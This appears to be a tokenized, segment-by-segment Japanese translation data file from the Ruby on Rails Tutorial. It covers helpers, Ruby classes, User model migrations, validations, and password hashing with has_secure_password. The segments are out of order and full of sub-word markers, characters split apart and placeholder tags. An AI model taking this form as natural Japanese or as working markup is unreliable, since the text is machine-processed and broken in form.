▁ 具体的には 、 ▁{0} config {/0} 変数 で 「 本番環境で は SSL を 強 制 する 」 という 設定 を する だけです ▁( リスト { p 1 })。
▁{0}{1} 第 8 章 {/1}{/0} では 、 認 証 ▁( authentication ) ▁ システム を導入し 、 ユーザーが ログイン と ログアウト を できるようにします 。
▁{0}{1} 第 9 章 {/1}{/0} では 、 どの ユーザー も 自分の アカウント 情報を 更新 できるように し 、 Web サイトの 管理者 が ユーザーを削除 できるようにします 。 それ により 、 Users リソース に 表 \ ref { table : RESTful _ users } の REST アクション が すべて 実装 される ようにします 。
▁\ ko de { form _ for } ヘルパーは 、 Active ▁Record の オブジェクト に 対応 した フォーム を生成する
▁リスト \ ref { code : gravatar _ option } のコード を使用して 、 { p 2 } で 定義された {3} gravatar _ for {/3} ヘルパー に オプション の {3} size {/3} パラメータ ー を 取 る ことができる ▁( {3} gravatar _ for ▁ user , ▁ size : ▁4 0 {/3} のような コードを ビューで 使用できる ) ▁ ことを確認 してください 。
▁ どの く ら い 細 か く テスト するか は お 任 せ します 。 ▁リスト \ ref { code : flash _ test } に 最 小 限 の テンプレート を 用 意 して お いた ので 、 参 考 に してください ▁( ヒント : ▁\ ko de { F I L L _ IN } メソッドを 適切な コード に置き換え ると 完成 します )。
▁ より 読み や す く した リスト \ ref { code : layout _ flash _ content _ tag } のコード に対して テストスイート を実行し 、 こ ち ら も 正常に 動作する ことを確認 してください 。 このコード では 、 Rails の \ ko de { content _ tag } ヘルパー を使用しています 。
▁\ ko de { gravatar _ for } ヘルパー に キーワード 引数 を追加する
▁\ ko de { content _ tag } を使って レイアウト の中に \ ko de { flash } を 埋 め 込 む
▁\ ko de { full _ title } ヘルパー のテスト
▁これ をチェックする には 否 定 演算子 ▁(\ ref { sec : objects _ and _ message _ passing }) が 必要な ので 、\ ko de { ! } ▁( 参 考 : ▁ 英語 では b an g と 読み ます ) ▁ を使用します 。
▁ これはリスト \ ref { code : re al _ user _ fixture } で使用されていま した 。
▁この アイディア に従って リスト \ ref { code : login _ create _ user _ instance } と リスト \ ref { code : im pro v ed _ remember _ me _ test } の 不 足 分 を 埋 め ▁( ヒント として \ ko de { ● } や \ ko de { F I L L _ IN } を 目 印 に 置 いて あります ) 、[ remember ▁ me ] ▁ チェックボックス のテスト を 改良 してください 。
▁{0}{1} 第 5 章 {/1}{/0} では 、 新しい ユーザー を作成する ための ス タブ ページを 作 った ところで 終わり ました ▁(\ ref { sec : user _ signup })。
▁{0}{1} 第 7 章 {/1}{/0} では 、 ユーザーが サイトに ユーザー登録 できるように し 、 ユーザー プロファイル のための ページ を作成します 。
▁ ユーザー登録 できる ようになった ら 、 ログイン や ログアウト を できる 仕組み を 作り ▁( {0}{1} 第 8 章 {/1}{/0} ) 、 {2} {1} 第 9 章 {/1} {/2} から は 不 正 な アクセス を 取り 扱 う 方法 について 学 んで い きます ▁(\ ref { sec : requir ing _ logged _ in _ users }) ▁ 。
▁最後に 、 {0}{1} 第 10 章 {/1}{/0} で メールアドレス を使って アカウントを有効化する 方法 と 、 パスワードを リセット する方法について 学 び ます 。
▁ まとめ ると 、 {0}{1} 第 6 章 {/1}{/0} から {2} {1} 第 10 章 {/1} {/2} を通して 、 Rails の ログイン と 認証システム を ひ と とおり 開発 します 。
▁ メールアドレスを ユーザー名 に した ことで 、 ユーザー 同士 で 通 信 できるように 拡 張 できる 可能性 が 開 か れ ます ▁( {0}{1} 第 10 章 {/1}{/0} )。
▁リスト \ ref { code : example _ user } では 、 以下のように Ruby の \ ko de { attr _ accessor } メソッド を使用し ました 。
▁リスト { p 0} にある {2} generate {/2} コマンド の 結果 の ひとつ として 、\ emph { マイグレーション } と呼ばれる 新しい ファイルが 生成されます 。
▁この User モデルの 例 の場合 、 マイグレーション は モデル 生成 スクリプト によって自動的に 作 られ ました 。 リスト { p 0} に示したように {2} name {/2} と {2} email {/2} の 2 つの カラム を持つ {2} users {/2} テーブル を作成します
▁リスト \ ref { code : users _ migration } の場合 、\ ko de { change } メソッドは \ ko de { create _ table } という Rails の メソッドを 呼 び 、 ユーザーを 保存 するための テーブル を データベースに 作成 します 。
▁\ ko de { create _ table } メソッドは ブロック 変数 を 1 つ 持つ ブロック ▁(\ ref { sec : block s }) ▁ を受け取り ます 。 ここでは ▁( “ table ” の 頭 文字 を 取 って ) ▁\ ko de { t } です 。
▁{0} 図 6 . 4 {/0} ▁{1} リスト \ ref { code : users _ migration } で 生成された User の データモデル {/1}
▁上の コマンド では 、 データベースから users テーブル を削除する ために \ ko de { d r o p _ table } コマンド を 内部で 呼び出し ています 。
▁これ が うまく い く のは 、\ ko de { change } メソッドは \ ko de { d r o p _ table } が \ ko de { create _ table } の 逆 であることを 知 っている からです 。 つまり 、 ロー ル バ ッ ク 用の 逆 方 向 マイグレーション を簡単に 導 く ことができる のです 。
▁ これまで 、 リスト \ ref { code : generate _ user _ model } の User モデルの 作成 によって どのように ▁( {2} {1} リスト 6 . 2 {/1} {/2} の ) ▁ マイグレーション ファイルが 作成される か を見 てきました 。 そして 図 \ ref { fig : sqlite _ database _ browser } で この マイグレーション を実行し た 結果を 見 ました 。 \ ko de { users } テーブル を作成する ことで 、\ ko de { development . sqlite 3 } という 名 の ファイル を更新し 、\ ko de { id }、\ ko de { name }、\ ko de { email }、\ ko de { created _ at }、\ ko de { updated _ at } を作成し ました 。
▁{0}{1} 第 4 章 {/1}{/0} と同じ く 、 Rails コンソール を使用して データモデル を調べ てみましょう 。
▁\ ref { sec : a _ user _ class } の コンソール セッション では \ ko de { User . new } で 新しい ユーザー オブジェクト を生成し ましたが 、 リスト \ ref { code : example _ user } の example _ user ファイルを 明示的に require する まで この オブジェクト には アクセス できません で した 。
▁\ ref { sec : a _ user _ class } では 、 オブジェクトの 属性 を設定する ための \ emph { 初期化 ハッシュ ▁( hash ) ▁ } を 引数に 取 るように 、 User クラス の例 ▁( user _ example . rb ) ▁ を 設計 しました 。 この 設計 は 、 同様 の 方法で オブジェクトを 初期化 する Active ▁Record の 設計 に基づいて います 。
▁作成した 時点 で のユーザー オブジェクトは 、\ ko de { id } 属性 、 マ ジ ッ ク カラム である \ ko de { created _ at } 属性 と \ ko de { updated _ at } 属性 の 値が いずれ も \ ko de { nil } で あった ことを思い出してください 。
▁ 詳 細 は {0}{1} 第 7 章 {/1}{/0} でも 説明します が 、 上で 見 た ように モデルの 生成 と 保存 を 2 つの ステップ に 分 け ておく と 何か と 便利です 。 しかし 、 Active ▁Record では \ ko de { User . create } で モデルの 生成 と 保存 を 同時に お こ な う 方法 も 提供され ています 。
▁ これまで メールアドレスを ユーザー名 として 使用 し てきた ので 、 このような \ ko de { find } 関連 メソッドは 、 ユーザーを サイトに ログイン させる 方法 を学ぶ ときに 役 に 立 ち ます ▁( {1}{2} 第 7 章 {/2}{/1} )。
▁ユーザー 数 が 膨 大 になる と \ ko de { find _ by } では 検索 効率 が 低 下 する の では ない か と 心 配 する 方 も いる かもしれませんが 、 あ せる 必要はありません 。 この問題 および データベースの インデックス を使った 解決 策 については \ ref { sec : uniqueness _ validation } で 扱 います 。
▁\ ko de { update _ attributes } メソッドは \ ko de { update } メソッドの エイリアス ですが 、 単 一 属性 を変更する \ ko de { update _ attribute } メソッドと の違い を 明 確 に するために 、 筆者 は 長 い メソッド 名 の 方 を 好 んで 使 っています 。
▁\ ko de { update _ attributes } メソッドは 属性 の ハッシュ を受け取り 、 成功 時に は 更新 と 保存 を 続けて 同時に 行います ▁( 保存 に成功した場合 は \ ko de { true } を返します )。
▁ただし 、 検証 に 1 つ でも 失敗する と 、 { 0} update _ attributes の 呼び出し は 失敗 します 。 たとえば 、 { p 1 } {/0} で 実装 する 、 パスワードを レコード に保存 すること を 要求 すると 検証 は 失敗 します 。
▁ 特定の 属性 のみ を更新し たい場合は 、 以下のように \ ko de { update _ attribute } を使います 。 なお 、 update _ attribute には 検証 を 回 避 する といった 効果 もあります 。
▁ 有効な オブジェクト に対して テストを書く ために 、\ ko de { setup } という 特殊な メソッドを使って 有効な User オブジェクト ▁(\ ko de {@ user }) ▁ を作成します ▁( このメソッドは {1}{2} 第 3 章 {/2}{/1} の 演習 でも 少し 取り上げ ました )。 setup メソッド 内に 書かれ た 処理 は 、 各 テストが 走 る 直 前に 実行されます 。 \ ko de {@ user } は インスタンス変数 ですが 、 setup メソッド 内で 宣言 しておけば 、 すべての テスト 内で この インスタンス変数 が 使えるようになります 。 したがって 、\ ko de { valid ?} メソッドを使って User オブジェクトの 有効 性 をテストする ことができます ▁(\ ref { sec : creat ing _ user _ objects }) . 。
▁ 有効な User かどうか をテストする ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁まずは リスト { p 0} に 、 {2} name {/2} 属性 の 存在性 に関する テスト を追加します 。
▁ 具体的には リスト \ ref { code : name _ presence _ test } のように 、 まず \ ko de {@ user } 変数 の \ ko de { name } 属性 に対して 空白 の 文字列を セット します 。 そして 、\ ko de { assert _ not } メソッドを使って ▁User オブジェクトが 有効 で なく な った ことを確認します 。
▁{0}{1} 第 2 章 {/1}{/0} の 演習 で 少し 触 れ ましたが 、 name 属性 の 存 在 を 検 査 する方法 は 、 リスト { p 2 } に示した とおり 、 {3} validates {/3} メソッド に {3} presence : ▁true {/3} という 引数 を与えて 使う ことです 。
▁\ ko de { name } 属性 の 存在性 を検証する ▁GR EEN {3} { 4 } {/4} { 4 } { 5 }{/ 5 } {/4} { 4 } {/4} {/3}
▁この 変更 により リスト \ ref { code : name _ presence _ test } のテスト は {2}{3}{/3}{3}{4} 成功 {/4}{/3}{3}{/3} {/2} している はずです 。
▁\ ko de { email } 属性 の 存在性 を検証する ▁GR EEN {3} { 4 } {/4} { 4 } { 5 }{/ 5 } {/4} { 4 } {/4} {/3}
▁これで すべての 存在性 が チェック された ので 、 テストスイート は {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} するはずです 。
▁\ ko de { name } 属性 に 長さ の 検証 を追加する ▁GR EEN {3} { 4 } {/4} { 4 } { 5 }{/ 5 } {/4} { 4 } {/4} {/3}
▁この コレクション を 作る ために 、 以下の コンソール セッション に示した ような 、 文字列 の配列 を簡単に 作 れる \ ko de { % w [ ]} という 便利な テクニック を 知 っ ておく と 良い でしょう 。
▁ 有効な メール フォーマット をテストする ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁( 詳 細 な 文字列 を調べ るために { p 0} で紹介した {2} in spec t {/2} メソッド を使っています 。 )
▁ どの メールアドレス で 失敗した のか を 知 ること は 非常に 便利です 。 そこで リスト { p 0} では 、 {2} each {/2} メソッドを使って 各 メールアドレスを 順に テスト しています 。 ル ー プ さ せずに テスト すると 、 失敗した 行 番号 から と メールアドレス の 行 数 を 照 ら し 合わせ て 、 失敗した メールアドレスを 特 定 する といった 作業 が発生し てしまいます 。
▁ 英 数字 、 アンダースコア ▁( _ ) 、 プ ラ ス ▁( + ) 、 ハ イ フ ン ▁( - ) 、 ドット ▁( . ) ▁ のいずれか を 少なくとも 1 文字 以上 繰り返す
▁{0} 表 6 . 1 {/0} ▁{1} メールの 正規表現 を 分 解 した 結果 {/1}
▁{0} 図 6 . 4 {/0} ▁{1} 素晴らしい 正規表現 エディタ \ href { http :// www . r ub ul ar . com /}{ R ub ul ar }{/1}
▁ メール フォーマット を 正規表現 で 検証 する ▁( ▁\ passing ▁ { 5 }{/ 5 } ▁ { 6 } app / models / user . rb { / 6 })
▁ 正規表現 \ ko de { V A L ID _ E M A I L _ RE G E X } は \ emph { 定数 } です 。 大文字 で 始 ま る 名前 は Ruby では 定数 を 意味 します 。
▁ 重複 する メールアドレス 拒 否 のテスト ▁( ▁\ failing ▁ ) ▁ { 5 }{/ 5 } { 6 } test / models / user _ test . rb { / 6 }
▁ 幸 い 、\ ko de { : uniqueness では \ ko de { : case _ s en s it ive } という 打 って つ け の オプション が 使用できます ▁( リスト \ ref { code : validates _ uniqueness _ of _ email _ case _ in s en s it ive } })。
▁たとえば 、 リスト { p 0} の マイグレーション によって 作成された {2} email {/2} 属性 について 考えてみましょう 。
▁{0}{1} 第 7 章 {/1}{/0} では ユーザーを サンプル アプリ に ログイン できるようにします が 、 このとき 、 送信された もの と 一致する メールアドレス の ユーザーの レコード を データベース の中から 探 し だ す 必要があります 。
▁もちろん 、 リスト { p 0} の {2} users {/2} テーブル 用の マイグレーション ファイルを 単 に 編集 すること も 可能な のですが 、 その 場合 ロー ル バ ッ ク が 必要 と なり 、 マイグレーション が 戻 ってしまいます 。
▁上のコードでは 、\ ko de { users } テーブル の \ ko de { email } カラム に インデックス を追加する ために \ ko de { add _ index } という Rails の メソッド を使っています 。
▁User の デフォルト fixture ▁( {2}{3}{/3}{3}{4} RE D {/4}{/3}{3}{/3} ) {/2}
▁また 、 この fixture は {0}{1} 第 8 章 {/1}{/0} になる まで 使 わ ない 予 定 なので 、 今 の ところ は これらの データを 削除 しておき 、 ユーザー 用の fixture ファイルを 空 に しておきましょう ▁( リスト \ ref { code : empty _ fixtures })。
▁ 空 の fixture ファイル ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁ 今回の 場合は 、 オブジェクトが 保存 される 時点 で 処理 を実行し たい ので 、\ ko de { before _ save } という コールバック を使います 。 これ を使って 、 ユーザー をデータベースに保存する 前に email 属性を 強 制 的に 小文字 に変換 します
▁( 本チュートリアルで 初めて 紹 介 した テクニック ですが 、 この テクニック については 第 10 章 で もう一度 取り上げ ます 。 そこで は コールバック を定義する ときに { 0} メソッド を参照 する {/0} という 慣習 について説明し ます 。 ) {1} \ emph { }{/1}
▁ email 属性を 小文字 に変換 して メールアドレス の 一意性 を 保 証 する ▁( {2}{3}{/3}{3}{4} G R EEN {/4}{/3}{3}{/3} ) {/2}
▁リスト \ ref { code : email _ downcase } のコードは 、\ ko de { before _ save } コールバック に ブロック を渡して ユーザーの メールアドレス を設定します 。 設定 される メールアドレス は 、 現在の 値を String クラスの \ ko de { downcase } メソッドを使って 小文字 バージョン にしたもの です 。
▁ 実は { p 0} の {2} palindrome {/2} 内で {2} reverse {/2} ▁ メソッドを使って い たとき も 、 同様 の ケース で あった ことを思い出してください 。 その とき と同様 で 、 左 式 では {2} self {/2} を省略 すること は \ emph { できません } 。 したがって 、
▁ { p 0} では {2} ハッシュ {/2} とは Ruby の データ 構造 である と 説明 しました が 、 今回の 「 ハッシュ化 」 とは そう い った 構造 ではなく 、\ href { http :// en . w ikipedia . org / wiki / Hash _ f un c tion } { ハッシュ 関数 } を使って 入力 された データを 元に戻 せ ない ▁( 不 可 逆 な ) ▁ データ にする 処理 を 指 します 。 )
▁また 、 入力 された パスワード を使用して ユーザーを \ emph { 認 証 } する手段 と 、 {1}{2} 第 8 章 {/2}{/1} で使用する 、 ユーザーが サイトに ログイン できるように する手段 も 提供し ます 。
▁ セキュア な パスワード の実装 は 、\ ko de { has _ secure _ password } という Rails の メソッド を呼び出す だけで ほとんど 終わっ てしまいます 。 このメソッドは 、 User モデル で 次のように 呼 び 出 せ ます 。
▁ セキュア に ハッシュ化 した パスワードを 、 データベース 内の \ ko de { password _ digest } という 属性 に保存 できるように な る 。
▁この 魔 術 的な \ ko de { has _ secure _ password } 機能を 使えるように するには 、 1 つ だけ 条件 があります 。 それ は 、 モデル 内に \ ko de { password _ digest } という 属性 が含まれ ている ことです 。
▁たとえば 、 ( 実は 本書 の 第 1 版 や 第 2 版 でも 間 違 って いた のですが ) ▁\ href { https :// github . com / rails / rails / b lo b / master / active model / lib / active _ model / secure _ password . rb } { has _ secure _ password } の \ ko de { ソースコード } でも この 手 の 間 違 い があります 。
▁{0} 図 6 . 8 {/0} ▁{1} User モデルに \ ko de { password _ digest } 属性 を追加する {/1}
▁ 図 \ ref { fig : user _ model _ password _ digest } のような データモデル に するために 、 まず は \ ko de { password _ digest } カラム 用の 適切な マイグレーション を生成します 。
▁\ ko de { add _ password _ digest _ to _ users } という マイグレーション ファイル を生成する ためには 、 以下のコマンドを実行し ます 。
▁上の コマンド では \ ko de { password _ digest : string } という 引数 を与えて 、 今回 必要 になる 属性 名 と 型 情報を 渡 しています 。
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁\ ko de { users } テーブル に \ ko de { password _ digest } カラム を追加する マイグレーション
▁リスト \ ref { code : password _ migration } では 、\ ko de { add _ column } メソッドを使って \ ko de { users } テーブル \ ko de { password _ digest } カラム を追加し ています 。
▁また 、\ ko de { has _ secure _ password } を使って パスワードを ハッシュ化 するために は 、 最 先 端 の ハッシュ 関数 である \ href { http :// en . w ikipedia . org / wiki / B c ry p t } { bcrypt } が 必要 になります 。
▁User モデルに \ ko de { password _ digest } 属性 を追加し 、 Gemfile に bcrypt を追加した ことで 、 よう や く User モデル 内で \ ko de { has _ secure _ password } が 使えるように なりました ▁( リスト \ ref { code : has _ secure _ password })。
▁User モデルに \ ko de { has _ secure _ password } を追加する ▁( ▁\ failing ▁ )
▁ テストが 失敗する 理由 は 、\ ref { sec : a _ hash ed _ password } で 触 れ た ように \ ko de { has _ secure _ password } には 、 仮 想 的な \ ko de { password } 属性 と \ ko de { password _ confirmation } 属性 に対して バリデーション を する 機能 も ( 強 制 的に ) 追加 されている からです 。 しかし リスト \ ref { code : validates _ uniqueness _ of _ email _ case _ in s en s it ive _ test } の テストでは 、\ ko de {@ user } ▁ 変数 に このような 値が セット され ており ません 。
▁User モデル に対して \ ko de { has _ secure _ password } を追加する 利 点 は \ ref { sec : creat ing _ and _ a u the n tic at ing _ a _ user } で 少し だけ 説明します が 、 ▁その 前に 、 パスワード の 最 小文字 数 を 設定 する方法について 説明します 。
▁リスト { p 0} では {2} ma x im um {/2} を使って ユーザー名 の 最 大文字 数 を 制限 していました が 、 これ と 似 た ような 形式 の {2} minimum {/2} という オプション を使って 、 最 小文字 数 のバリデーション を実装する ことができます 。
▁ これはリスト \ ref { code : password _ im p le m ent ation } で使用されていま した 。
▁ただし Web から の ユーザー登録 はまだ できない ▁( {0}{1} 第 7 章 {/1}{/0} で 完成 させ ます ) ▁ ので 、 今回は Rails コンソール を使って ユーザーを 手動で 作成する ことにしましょう 。
▁ { p 0} で説明した {2} create {/2} を使います が 、 後 々 実際の ユーザーを 作成 する必要が 出 て く る ので 、 今回は サ ンド ボックス 環境 は \ emph { 使い ません } 。 したがって 、 今回 作成した ユーザー を保存する と 、 データベースに 反 映 されます 。
▁( {0}{1} 第 7 章 {/1}{/0} で もっと 便利な メソッドを 紹 介 します )
▁{0} 図 6 .9{/0} ▁{1} SQLite データベース \ ko de { db / development . sqlite 3 } に 登録 された ユーザーの 行 {/1}
▁ コンソール に 戻 って \ ko de { password _ digest } 属性 を参照 してみる と 、 リスト \ ref { code : password _ im p le m ent ation } の \ ko de { has _ secure _ password } の 効果 を 確認 できます 。
▁また \ ref { sec : a _ hash ed _ password } で 説明したように 、\ ko de { has _ secure _ password } を User モデル に追加 した ことで 、 そのオブジェクト 内で \ ko de { authenticate } メソッドが 使えるように な っています 。
▁このメソッドは 、 引数に 与えられた 文字列 ▁( パスワード ) ▁ を ハッシュ化 した 値 と 、 データベース 内に ある \ ko de { password _ digest } カラム の 値を 比 較 します 。
▁{0}{1} 第 8 章 {/1}{/0} では 、 この \ ko de { authenticate } メソッドを使って ログイン する方法 を 解説します 。
▁ 次の {0}{1} 第 7 章 {/1}{/0} では 、 ユーザー を作成する ための ユーザー登録フォーム を作成し 、 各 ユーザーの 情報を 表示 するための ページ も 作成 します 。
▁{0}{1} 第 8 章 {/1}{/0} では 、\ ref { sec : adding _ a _ secure _ password } の 認証システム を 利用 して 、 ユーザーが 実際に Web サイトに ログイン できるようにします 。
▁この テストでは 、\ ko de { reload } メソッドを使用して データベースから 値を 再度 読み込み 、\ ko de { assert _ equ al } メソッドを使用して 同 値 である かどうかを テスト してください 。
▁\ ko de { before _ save } コールバック 内で \ ko de { email . downcase ! } と 書き 、\ ko de { email } 属性 を直接 変更 しても よい ことを 、 テストスイート を 走 ら せ て 確認 してください ▁( リスト \ ref { code : downcase _ b an g } のように 書い ても よい ことを 、 テストスイート を実行して 確認 してください 。
▁\ ko de { before _ save } コールバック の 別の 実装
▁この 章では 、 {0}{1} 第 3 章 {/1}{/0} で 使用 した 例 を 基 に 、 Rails において 重要 となる Ruby の さまざまな 要素 について 探 って い く ことにしましょう 。 { 2
▁ 前 章 の 終わり では 、 Rails の レイアウト を使用して ビューで の 重複 を 取り 除 く ために 、 ほぼ 静的なページ を 単 に 更新 した に と ど まり ました ▁( {0}{1} リスト 4.1 {/1}{/0} )。 これは 、 {2} {1} リスト 3 . 3 2 {/1} {/2} と同じ ものです 。
▁ サンプルアプリケーションの レイアウト ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁{0}{1} リスト 4.1 {/1}{/0} の 以下の行 にご注目ください 。
▁ここでは 、 Rails の 組み込み 関数 \ ko de { stylesheet _ link _ tag } ▁( 詳 細 は \ href { http :// api . rubyonrails . org / classes / ActionView / Helper s / Asset T a g Helper . html # method - i - stylesheet _ link _ tag } { Rails ▁API } を参照 ) ▁ を使用して 、\ ko de { application . css } を すべての \ href { http :// www . w 3 . org / T R / CSS 2 / media . html } { メ デ ィ ア タイプ } に インクルード しています ▁( メ デ ィ ア タイプ には 、 コンピュータ の 画面 や 印 刷 画面 など も 含 まれ ます )。
▁この 関数 は \ emph { ヘルパー } と 呼ばれ ます 。 カスタム ヘルパー を作成する 方法 を学ぶ ために 、 まず {1}{2} リスト 4.1 {/2}{/1} の タイトル 行 の 部分 に 注 目 しましょう 。
▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁A p p
▁ ページ タイトル が正しく 表示 され ない 問題 を 解決 するために 、\ ko de { full _ title } という ヘルパー を作成する ことにします 。
▁\ ko de { full _ title } ヘルパーは 、 ページ タイトル が 定義 されていない 場合は 基本 タイトル 「 Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁A p p 」 を返し 、 定義されている 場合は 基本 タイトル に 縦 棒 と 追加 ページ タイトル を追加して 返します ▁( {1}{2} リスト 4 . 2 {/2}{/1} )
▁ ある ヘルパー が 特定の コントローラ で のみ 使用する も のであれば 、 それ に対応する ヘルパー ファイル に置く 必要があります 。 たとえば StaticPages コントローラ 用 ヘルパーは 、 通常 \ ko de { app / helpers / static _ pages _ helper . rb } になります 。
▁ 今回の 場合 、\ ko de { full _ title } ヘルパーは サイトの すべての ページ で使用する ことを 前 提 に しています が 、 Rails には このような 場合 のための 特別な ヘルパー ファイル \ ko de { app / helpers / application _ helper . rb } があります 。
▁\ ko de { full _ title } ヘルパー を定義する
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁\ ko de { full _ title } ヘルパー を使った Web サイトの レイアウト
▁これ を行う には 、 まず {0}{1} リスト 4 . 4 {/1}{/0} に 示す ように 以前の テストコード を更新し 、\ ko de { " Home "} ▁という 文字 が表示され ていない ことを確認する テスト を追加します 。
▁ テストが パス するために は 、\ ko de { {1} リスト 4 . 6 {/1} } のように Home ページの ビュー から {2} pro v id e {/2} の 行 を削除する 必要があります 。
▁Rails 開発 経験 者 にとって は 、 {0}{1} リスト 4 . 2 {/1}{/0} のコードは スタイルシート を インクルード する の と 大 差 ない 単純な ものです が 、 ここに も Ruby の 重要な 概念 が \ emph { 多 数 } 含まれています 。 モジュール 、 メソッド 定義 、 任意の メソッド 引数 、 コメント 、 ローカル変数 の 割り当て 、 論理値 ▁( boolean ) 、 制 御 フ ロー 、 文字列 の 結合 、 そして 戻り値 です 。
▁ ほぼ あらゆる オブジェクトを 文字列 に変換 する \ ko de { to _ s } メソッドを使用して 、 nil が メソッド に応答する 例 を お 目 に かけ ましょう 。
▁この ように 、\ ko de { nil } オブジェクト 自身 は \ ko de { empty ?} メソッド には 応答 しない にも か か わ らず 、\ ko de { nil . to _ s } と すると 応答 する ことがわかります 。
▁Rails コンソール でも 、\ ko de { {1} リスト 3 . 6 {/1} } の {2} home {/2} アクション や 、 {3} {1} リスト 4 . 2 {/1} {/3} の {2} full _ title {/2} ヘルパー と同じ 方法で メソッド を定義する ことができます
▁たとえば 、\ ko de { 引数 } を 1 つ 取り 、 引数 が 空 かどうか に 基 づ いた メッセージ を返す \ emph { string _ message } という 関数 を定義し てみましょう 。
▁つまり 、 最初の 例 の \ ko de { s tr } を 別の 変数 名 ▁(\ ko de { the _ f un c tion _ ar g um ent } など ) ▁ に変更 しても 、 メソッドの 呼び出し 方は 全 く 同じです 。
▁ とは い う もの の 、 まだ 理解 していない ことが \ emph { 1 つ } あります 。 \ emph { Rails が \ emph { どのように して } これら を 結 び つ け ている か ということです 。 URL を アクションに マ ッ プ する方法 や 、\ ko de { full _ title } } ヘルパー を ビューで 利用 できるように する方法 など が そう です 。
▁ 注 釈 付き の \ ko de { title _ helper } .
▁ The ▁ re s ul t ▁is ▁that ▁the ▁\ ko de { full _ title } ▁ method ▁is ▁\ href { http :// cat b . org / j ar g on / html / A / auto ma g ical ly . html } { auto ma g ical ly } ▁ available ▁in ▁ all ▁ our ▁ views .
▁\ emph { Rails チュートリアル } では これまで 配列 について 解 説 していません で した が 、 配列 を理解する ことは 、 ハッシュ ▁(\ ref { sec : hash es _ and _ symbol s }) ▁ や Rails の データモデル を理解する ための 重要な 基 盤 となります ▁( データモデル とは \ ko de { has _ many } などの 関連付け の こと であり 、\ ref { sec : demo _ user _ has _ many _ microposts } や \ ref { sec : user _ micropost _ association s } で 詳 しく 説明します )。
▁\ emph { 範囲 ▁( range ) } ▁ は 、 配列 と 密 接 に 関係 しています 。 \ ko de { to _ a } メソッドを使用して 配列 に変換 すると 理解 し やすい と思います 。
▁{0}{1} リスト 4.1 0 {/1}{/0} に示したように 、 ハッシュ の値 には ほぼ 何 でも 使用する ことができ 、 他の ハッシュ を使用すること す ら できます 。
▁それでは 、 もう一度 {0}{1} リスト 4.1 {/1}{/0} に 戻 り 、 レイアウト に ▁ CSS ▁( ca sc ad ing ▁ style ▁ sh e e t ) ▁ を追加する 以下の行 を見てみましょう 。
▁たとえば 、 {0}{1} 図 1 . 5 {/1}{/0} を もう一度 見 てみると 、 コードを 8 0 文字 以下 に 抑 え るため の 小さな 縦 線 が 右 側 に 見え ます 。
▁上のコードでは \ ko de { stylesheet _ link _ tag } 関数 を 2 つの 引数 で 呼 んで います 。 最初の 引数 である 文字列 は 、 スタイルシート への パス を 示 しています 。 次の 引数 である ハッシュ には 2 つの 要素 があり 、 最初の 要素 は メ デ ィ ア タイプ を 示 し 、 次の 要素 は Rails ▁4.0 で 追加 された \ href { https :// github . com / rails / turbolinks } { turbolinks } という 機能を オン に しています 。
▁ 継 承 階層 を {0}{1} 図 4.1 {/1}{/0} に示します 。
▁{0} 図 4.1 {/0} ▁{1} \ ko de { String } クラスの 継 承 階層 {/1}
▁ 単 語 \ emph { は } 文字列 なので 、\ ko de { {2} リスト 4.1 2 {/2} } のように {3} Word {/3} クラス は ▁ {3} String {/3} クラス を \ emph { 継 承 } する の が 自 然 です
▁ { p 0} でも 簡単に 説明 しました が 、 上のコード の {2} Word ▁< ▁ String {/2} は 継 承 のための Ruby の 記 法 です 。 こうすることで 、 新しい {2} palindrome ? {/2} メソッド だけ ではなく 、 String クラス で 使用できる すべての メソッドを Word クラス に対して も 使用 できるようになります 。
▁{0}{1} 図 4 . 2 {/1}{/0} に この クラス 階層 を示します 。
▁{0} F ig ur e ▁4 . 2 : ▁{/0}{1} The ▁ inheritance ▁ h i er ar ch y ▁for ▁the ▁( n on - b u il t - in ) ▁\ ko de { Word } ▁class ▁ from ▁ L ist ing ▁\ ref { code : word _ class } . {/1}
▁{0}{1} リスト 4.1 2 {/1}{/0} では 、 単 語 の 文字 を 逆 順 にしたもの が 元の 単 語 と同じ である かどうか の チェック を 、\ ko de { Word } クラス の中から 自分自身 が 持つ 単 語 にアクセス することで 行 な っている ことにご注目ください 。
▁ これまで クラス や 継 承 について説明し てきました が 、 これらの 話 は 前 の 章 にも あった ような 気 が します 。 { それ も その は ず で 、 StaticPages コントローラ で 継 承 や クラス について 触 れ た こと があり ました ▁( {0}{1} リスト 3.1 8 {/1}{/0} )。
▁ 継 承 の関係 を {0}{1} 図 4 .3{/1}{/0} に示します 。
▁\ ko de { {1} 第 3 章 {/1} } で示した とおり 、 {2} home {/2} アクション は Web ページ を表示する ための もの であり 、 値 を返す ための もの ではありません で した 。
▁最後に 完全な クラス を作成して 、 この章 を 終わり に しましょう 。 そこで 、\ ko de { {1} 第 6 章 {/1} } で使用する {2} User {/2} クラス を 最 初 から 作成する ことにします 。
▁ これまで は コンソール 上で クラス を定義し ましたが 、 このような 面倒 な 作業 は もう 行 いた く ありません 。 これ から は 、 アプリケーションの ルート ディレクトリ に \ ko de { example _ user . rb } ファイル を作成し 、 そこ に {1}{2} リスト 4.1 3 {/2}{/1} のように 書く ことにします 。
▁ example _ user で使用する コード
▁このコードは 、 { p 0} や \ ref { sec : mvc _ in _ action } でも 説明したように 、 {3} @ name {/3} および {3} @ email {/3} { 4 } インスタンス変数 {/4} について 、 取り出し ( get ) ▁ と 割り当て ( set ) ▁ を行う ▁" ゲ ッ ター " ▁ と ▁" セ ッ ター " ▁という メソッドを それぞれ 作成 します 。
▁最後に 、\ ko de { formatted _ email } メソッドを 定義 しましょう ▁(\ ref { sec : string s })。 このメソッドは 、 文字列 の 式 展開 を 利用 して 、\ ko de {@ name } と \ ko de {@ email } に 割り当て られ た 値を ユーザーの メールアドレス として 構成 します 。
▁\ ko de {@ } ▁ 記 号 によって 示 されている とおり 、\ ko de {@ name } と \ ko de {@ email } は 両方 とも インスタンス変数 なので 、 自動的に \ ko de { formatted _ email } メソッドで 使えるようになります 。
